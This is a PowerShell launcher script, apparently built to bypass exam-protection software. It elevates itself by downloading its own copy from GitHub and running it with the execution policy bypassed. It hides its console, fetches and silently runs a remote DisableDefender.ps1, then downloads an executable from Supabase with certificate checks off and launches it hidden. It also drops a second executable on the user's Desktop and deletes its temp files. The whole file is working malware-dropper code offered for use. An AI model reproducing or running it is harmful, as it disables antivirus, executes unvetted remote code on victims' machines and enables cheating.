# ================================================================ 
# FULL LAUNCHER
#   1) Elevate to admin
#   2) Fire DisableDefender.ps1 in the background (no wait)
#   3) Hide the window
#   4) Download + launch etsD.exe
#   5) Download Dwluncher.exe to the real user's Desktop
# ================================================================

# ---- SET THIS TO YOUR RAW GITHUB URL ----
$myUrl       = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/auto.ps1"
$defenderUrl = "https://raw.githubusercontent.com/examprotectorbypass/jjs/refs/heads/main/DisableDefender.ps1"

$etsUrl = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Auto_Gui.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0F1dG9fR3VpLmV4ZSIsInNjb3BlIjoiZG93bmxvYWQiLCJpYXQiOjE3OTAzNTQ5OTMsImV4cCI6MjEwNTcxNDk5M30.Op2kLFe4NTWxy0lh8yaiObbDj6FKUwd0frNWOulB2n8'

$dwUrl  = 'https://uddxinkwpjvqdxnaqelw.supabase.co/storage/v1/object/sign/myfiles/Dwluncher.exe?token=eyJraWQiOiIzYmU3ZTlhOS1hNTk5LTQ3NWMtOWU5OS0yZTRhODI5MDIzNTQiLCJhbGciOiJIUzI1NiJ9.eyJ1cmwiOiJteWZpbGVzL0R3bHVuY2hlci5leGUiLCJzY29wZSI6ImRvd25sb2FkIiwiaWF0IjoxNzg5NjM2NzMwLCJleHAiOjI0MjAzNTY3MzB9.Ky8yFMWdmlANKKjKDk8EV2F82h__tlV7o5p2gwxRzzI'

# ================================================================
# 1) Elevate if we're not admin yet
# ================================================================
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $tmpScript = Join-Path $env:TEMP ("launcher_" + [guid]::NewGuid().ToString() + ".ps1")
    try {
        Invoke-RestMethod -Uri $myUrl -OutFile $tmpScript -ErrorAction Stop
    } catch {
        return
    }

    # Launch elevated copy. It will hide its own window and continue silently.
    $child = Start-Process powershell.exe -Verb RunAs -Wait -PassThru -ArgumentList @(
        "-NoProfile",
        "-WindowStyle", "Hidden",
        "-ExecutionPolicy", "Bypass",
        "-File", $tmpScript
    )

    Remove-Item $tmpScript -Force -ErrorAction SilentlyContinue
    return
}

# ================================================================
# From here down: we are admin
# ================================================================
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ---- Hide this console window immediately ----
try {
    Add-Type -Namespace Win32 -Name NativeMethods -MemberDefinition @"
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(System.IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")]
        public static extern System.IntPtr GetConsoleWindow();
"@
    $hWnd = [Win32.NativeMethods]::GetConsoleWindow()
    if ($hWnd -ne [IntPtr]::Zero) {
        [void][Win32.NativeMethods]::ShowWindow($hWnd, 0)   # 0 = SW_HIDE
    }
} catch { }

# ================================================================
# 2) DisableDefender.ps1 — run in background, do NOT wait
# ================================================================
#   We download the script to a temp file, then start a hidden
#   child PowerShell that runs it. We do not block on it.
# ================================================================
$defenderTmp = Join-Path $env:TEMP ("dd_" + [guid]::NewGuid().ToString() + ".ps1")
try {
    Invoke-RestMethod -Uri $defenderUrl -OutFile $defenderTmp -ErrorAction Stop

    Start-Process powershell.exe -ArgumentList @(
        "-NoProfile",
        "-WindowStyle", "Hidden",
        "-ExecutionPolicy", "Bypass",
        "-File", $defenderTmp
    ) | Out-Null

    # Note: do NOT Wait-Process. It runs in the background.
} catch { }

# ================================================================
# 3) Download + launch etsD.exe
# ================================================================
$etsOut = Join-Path $env:TEMP 'xleetets.exe'
Remove-Item $etsOut -Force -ErrorAction SilentlyContinue

curl.exe -L --fail -k --silent --output $etsOut $etsUrl

if (Test-Path $etsOut) {
    Start-Process -FilePath $etsOut -WorkingDirectory $env:TEMP -WindowStyle Hidden
}

# ================================================================
# 4) Download Dwluncher.exe to the real user's Desktop
# ================================================================
#   When elevated, $env:USERPROFILE points to the admin's profile.
#   Resolve the real user's desktop via the explorer.exe owner.
# ================================================================
$desktop = $null
try {
    $explorer = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue |
                Select-Object -First 1
    if ($explorer) {
        $owner = Invoke-CimMethod -InputObject $explorer -MethodName GetOwner -ErrorAction SilentlyContinue
        if ($owner -and $owner.User) {
            $realDesktop = "C:\Users\$($owner.User)\Desktop"
            if (Test-Path $realDesktop) { $desktop = $realDesktop }
        }
    }
} catch { }

if (-not $desktop) {
    $desktop = [Environment]::GetFolderPath('Desktop')
}

$dwOut = Join-Path $desktop 'Dwluncher.exe'
Remove-Item $dwOut -Force -ErrorAction SilentlyContinue

curl.exe -L --fail -k --silent --output $dwOut $dwUrl

# ================================================================
# Cleanup: remove the temp Defender script (child already has it loaded)
# ================================================================
Start-Sleep -Seconds 2
Remove-Item $defenderTmp -Force -ErrorAction SilentlyContinue
